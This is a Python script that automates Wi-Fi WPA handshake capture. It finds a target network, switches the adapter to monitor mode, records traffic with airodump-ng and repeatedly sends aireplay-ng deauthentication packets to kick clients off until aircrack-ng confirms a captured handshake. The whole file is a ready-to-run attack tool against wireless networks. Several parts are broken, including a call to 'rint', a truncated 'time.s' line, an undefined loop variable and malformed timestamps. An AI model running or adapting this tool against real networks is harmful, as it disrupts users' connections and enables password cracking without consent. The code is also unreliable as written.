import sys                              # python xD
import argparse                         # parse flags
import os                               # check for directories, open processes
import subprocess                       # open processes
import re                               # parse output
import csv                              # parse output
import time                             # sleep
import netifaces                        # fetch interfaces
from difflib import get_close_matches   # for network guesses
from difflib import SequenceMatcher     # for network guesses
from termcolor import colored           # some colors for ya
from datetime import datetime as dt     # output time

# Parsing values ------------------ Start
parser = argparse.ArgumentParser(description='Automatically capture handshake')
parser.add_argument('ssid', metavar='network_name', help='Network name')
parser.add_argument('-i', metavar='interface', default = "", help='Interface')
parser.add_argument('-c', metavar='confidence', default = 0.6, help='Confidence in guessing network name if its incorrect (default = 0.6)')
parser.add_argument('--pAm', metavar='packets', type=int, default=5, help='Amount of packets to send (default = 5)')
parser.add_argument('--dir', metavar='directory', default = "", help='Directory (default = mydir/wifis/network_name)')
parser.add_argument('-m', metavar='mode', default = "", help="Set to pi if you are using raspberry")

args = parser.parse_args()
# Parsed values ------------------- End

# Global variables ------------------------- Start
Interface = args.i
Interfaces = []

SSID = args.ssid
BSSID = type(str)
Channel = type(int)
SignalStrength = type(int)

Confidence = 0.6 #How confident script must be in guessing network name

CurrentStation = ""
UsedStations = []
Stations = []
DeauthPacketsAmount = type(int)
if args.pAm != "":
    DeauthPacketsAmount = args.pAm
CyclesAmount = 1        # If all stations found fail to deauth, script will repeat deauth for all stations times CyclesAmount (1 == Repeat 1 times, 0 = dont repeat, rescan and then try to find new)

MY_DIRECTORY = os.popen("pwd").read()
SaveTo = "{}/wifis/".format(MY_DIRECTORY[:-1])
if args.dir != "":
    SaveTo = args.dir
    
isPi = False
if args.m == 'pi':
    isPi = True
# Global variables ------------------------- End

# Custom functions ------------------------- Start
def select_interfaces():
    global Interfaces
    global Interface
    InterfaceIndex = type(int)
    
    Interfaces.clear()
    interfaces = netifaces.interfaces()
    if len(interfaces) < 3:
        rint('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('ERROR', 'red') + '] ' + "No interfaces")
        sys.exit()
    index = 0
    for interface in interfaces:
            if(interface != "lo" and interface != "eth0"):
                command_set_interface_up = "sudo ifconfig {} up > /dev/null 2>&1".format(interface)
                os.popen(command_set_interface_up).read()
                Interfaces.append(interface)
                index += 1
    if Interface in Interfaces and args.i != "":
        return True
    if Interface not in Interfaces and args.i != "":
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + "No such interface")
        sys.exit()
    
    if len(Interfaces) > 1:
        while Interface == "":
            print("Choose interface: ")
            i = 0
            chosen = ""
            for interface in Interfaces:
                print(interface + f" ({i})")
                i += 1
            InterfaceIndex = int(input())
            if len(Interfaces) > InterfaceIndex:
                Interface = Interfaces[InterfaceIndex]
                return True
            else:
                print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('WARNING', 'yellow') + '] ' + "You picked the wrong house fool")
    else:
        Interface = Interfaces[0]
        InterfaceIndex = 0
        return True
    return False
        
def update_interfaces(monitor):
    global Interface
    try:
        if monitor:
            Interface += "mon"
            return True
        else:
            Interface = Interface[:-3]
            time.s
            return True
    except:
        return False
    
            
def monitor_mode():
    command_get_mode = "sudo iwconfig {} | awk -F: '/Mode/{{print$2}}'".format(Interface)
    output_get_mode = os.popen(command_get_mode).read().split(" ", 1)[0]
    if output_get_mode == "Monitor":
        return True
    else:
        return False

def start_network_manager():
    command_network_manager_start = 'dbus-run-session sudo systemctl start NetworkManager'
    os.popen(command_network_manager_start).read()
    return True

def start_airmon():
    if isPi == False:
        command_airmon_check_kill = "sudo airmon-ng check kill"
        output_airmon_check_kill = os.popen(command_airmon_check_kill).read()
    command_airmon_start = "sudo airmon-ng start {}".format(Interface)
    output_airmon_start = os.popen(command_airmon_start).read()
    update_interfaces(True)
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Changed interface: {Interface}")

def stop_airmon():
    command_airmon_stop = "sudo airmon-ng stop '{}'".format(Interface)
    os.popen(command_airmon_stop).read()
    update_interfaces(False)
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Changed interface: {Interface}")

def get_network_info_pi():
    global SSID
    global BSSID
    global Channel
    global SignalStrength
    command_scan_wifi = '''sudo iwlist wlan0 scan | egrep "ESSID:|Address:|Channel:" | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' '''
    output_scan_wifi = os.popen(command_scan_wifi).read()
    splited_output_scan_wifi = output_scan_wifi.split("\n")
    if splited_output_scan_wifi == []:
        time.sleep(5)
        output_scan_wifi = os.popen(command_scan_wifi).read()
        splited_output_scan_wifi = output_scan_wifi.split("\n")
    
    del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]    
    
    if splited_output_scan_wifi == []:
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('ERROR', 'red') + '] ' + "No networks found")
        sys.exit()
    
    wifiNames = []
    
    index = 1
    for record in splited_output_scan_wifi:
        if record == SSID:
            BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(SSID)-2]
            Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(SSID)-1])
            return True
        
        elif index == 3:
            wifiNames.append(record)
            index = 0
        index += 1
        
    try:
        closeMatch = get_close_matches(SSID, wifiNames, 1, Confidence)[0]
        BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
        Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('WARNING', 'yellow') + '] ' + f"No such network '{SSID}', assuming you typed '{closeMatch}'") 
        SSID = closeMatch
        return True
    except:
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('ERROR', 'red') + '] ' + "Error scanning for network (network name is incorrect) olala")
        sys.exit()
        return False

def get_network_info():
    global SSID
    global BSSID
    global Channel
    global SignalStrength
    command_scan_wifi = "nmcli dev wifi"
    output_scan_wifi = os.popen(command_scan_wifi).read()
    splited_output_scan_wifi = output_scan_wifi.split("\n")
    del splited_output_scan_wifi[0]
    if splited_output_scan_wifi == []:
        time.sleep(5)
        output_scan_wifi = os.popen(command_scan_wifi).read()
        splited_output_scan_wifi = output_scan_wifi.split("\n")
        del splited_output_scan_wifi[0]
        
    if splited_output_scan_wifi == []:
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('ERROR', 'red') + '] ' + "No networks found")
        sys.exit()
    
    cleanRecord = ()
    wifiNames = []
    
    for record in splited_output_scan_wifi:
        record = re.sub(" +", " ",record)
        record = record.strip()
        splitted_record = record.split(" ")
        if splitted_record != ['']:
            if splitted_record[0] == '*':
                del splitted_record[0]
            while 2 < splitted_record.index("Infra"):
                    splitted_record[1] += " " + splitted_record[2]
                    splitted_record.remove(splitted_record[i])
            if "WPA1" in splitted_record:
                index = splitted_record.index("WPA1")+1;
                splitted_record[splitted_record.index("WPA1")]+= " " + splitted_record[index]
                splitted_record.remove(splitted_record[index])
            del splitted_record[2]
            del splitted_record[3]
            del splitted_record[3]
            del splitted_record[4]
            cleanRecord += tuple(splitted_record,)
            wifiNames.append(splitted_record[1])
            if splitted_record[1] == SSID:
                if int(splitted_record[3]) < 40:
                    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('WARNING', 'yellow') + '] ' + "Signal strength is low, probably won't find clients.")
                SignalStrength = int(splitted_record[3])
                BSSID = splitted_record[0]
                Channel = int(splitted_record[2])
                return True
    try:
        closeMatch = get_close_matches(SSID, wifiNames, 1, Confidence)[0]
        BSSID = cleanRecord[cleanRecord.index(closeMatch)-1]
        Channel = int(cleanRecord[cleanRecord.index(closeMatch)+1])
        SignalStrength = int(cleanRecord[cleanRecord.index(closeMatch)+2])
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('WARNING', 'yellow') + '] ' + f"No such network '{SSID}', assuming you typed '{closeMatch}'") 
        SSID = closeMatch
        return True
    except:
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('ERROR', 'red') + '] ' + "Error scanning for network (network name is incorrect)")
        sys.exit()
        return False

def start_airodump():
    command_airodump = "sudo airodump-ng --bssid '{}' -c '{}' --write-interval 1 --write '{}' {} > /dev/null 2>&1".format(BSSID, Channel, SaveTo, Interface)
    airodumpProcess = subprocess.Popen(command_airodump, shell = True)

def fill_stations():
    global Stations
    Stations.clear()
    with open('{}-01.csv'.format(SaveTo), 'r') as csvfile:
        for i, l in enumerate(csvfile):
            if(i + 1 > 5):
                if(l.split(',')[0] != "\n"):
                    Stations.append(l.split(',')[0])
    
def select_station():
    global CurrentStation
    global UsedStations
    if CurrentStation == "":
        CurrentStation = Stations[0]
    if UsedStations != Stations or len(UsedStations) != len(Stations):
        for CurrentStation in UsedStations:
            CurrentStation = Stations[Stations.index(CurrentStation)+1]
    else:
        UsedStations.clear()
        CurrentStation = Stations[0]
    UsedStations.append(CurrentStation)
    
def deauth():
    command_aireplay = "sudo aireplay-ng --ignore-negative-one --deauth '{}' -a '{}' -c '{}' {} > /dev/null 2>&1".format(DeauthPacketsAmount, BSSID, CurrentStation, Interface)
    deauthProcess = subprocess.Popen(command_aireplay, shell = True).wait()
                
def make_directory():
    global SaveTo
    SaveTo += f"{SSID}/"
    location = SaveTo
    if os.path.isdir(location):
        if len(os.listdir(location)) > 0:
            i = 1;
            while os.path.isdir(location):
                if i >= 2:
                    location = location[:-1]
                location = location[:-1]
                location += str(i) + "/"
                i += 1
            SaveTo = location
            os.makedirs(SaveTo)
        else:
            SaveTo = location
    else:
        SaveTo = location
        os.makedirs(SaveTo)
    return True

def check_handshake():
    command_aircrack = "sudo aircrack-ng {}-01.cap | sed -n '7p' | tr -s ' ' | tr -d '()\n'".format(SaveTo)
    command_aircrack_output = os.popen(command_aircrack).read().split(" ")[5]
    if int(command_aircrack_output) > 0:
        return True
    else:
        return False
        
def check_for_stations():
    starttime = time.time()
    i = 1
    while True:
        if(i != 1):
            #check output
            fill_stations()
            if len(Stations) > 0:
                select_station()
                print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Stations: {Stations}")
                break
        i = i+1
        time.sleep(3.0 - ((time.time() - starttime) % 3.0))
# Custom functions ------------------------- End

# PROGRAM ---------------------------------- Start
if __name__ == "__main__":
    select_interfaces()
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Interface: {Interface}")
    if monitor_mode():
        stop_airmon()
    if isPi == False:
        start_network_manager()
        get_network_info()
    else:
        get_network_info_pi()
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"[SSID: {SSID}] [BSSID: {BSSID}] [Channel: {Channel}] [Signal strength: {SignalStrength}]")
    make_directory()
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Directory: {SaveTo}")
    start_airmon()
    start_airodump()
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Waiting for station...")
    check_for_stations()
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}")
    deauth()
    cyclesCount = 1
    while check_handshake() == False:
        print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('WARNING', 'yellow') + '] ' + "Failure")
        if len(Stations) > 1 and cyclesCount < len(Stations)*(CyclesAmount+1):
            print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + "Selecting another station")
            select_station()
            print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}")
            deauth()
            cyclesCount += 1
        else:
            print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + "Rescanning stations...")
            check_for_stations()
            print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue') +'] ' + '[' + colored('INFO', 'green') + '] ' + f"Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}")
            deauth()
            cyclesCount = 1
    print('['+ colored(f'{"{:02d}".format(dt.now().year)}:{"{:02d}".format(dt.now().month)}:{"{:02d}".format(dt.now().second)}', 'blue', attrs=['bold']) +'] ' + '[' + colored('INFO', 'green') + '] ' + "Success!")
    stop_airmon()            
    if isPi == False:
        start_network_manager()
# PROGRAM ---------------------------------- END
